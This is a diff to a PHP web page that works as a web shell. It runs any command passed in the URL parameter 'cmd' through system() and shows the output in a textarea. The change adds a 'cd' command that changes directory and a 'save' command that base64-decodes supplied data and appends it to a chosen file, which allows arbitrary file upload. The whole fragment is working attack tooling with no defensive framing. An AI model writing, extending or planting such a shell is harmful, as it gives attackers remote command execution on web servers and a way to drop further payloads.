@@ -38,7 +38,27 @@
      <textarea class="command-output" readonly="true" spellcheck="false" style="margin: 0px; height: 357px;" >
 <?php
 $cmd = $_GET['cmd'];
-system($cmd);
+$com = explode(" ",$cmd);
+if($com[0] === "cd"){
+   echo $cmd;
+   $com = explode(" ",$cmd);
+   $dir = $com[1];
+   chdir($dir);
+   $cwd = getcwd();
+   echo "[".$cwd.">";
+  }
+else if($com[0] == "save"){
+   $enc_data = $com[1];
+   $file_name = $com[2];
+   $file_save = fopen($file_name,'a');
+   $decoded = base64_decode($enc_data);
+   fwrite($file_save,$decoded);
+   fclose($file_save);
+  }
+
+else{
+   echo system($cmd);
+  }
 echo '</textarea>';
 echo '</body></html>';
 ?>
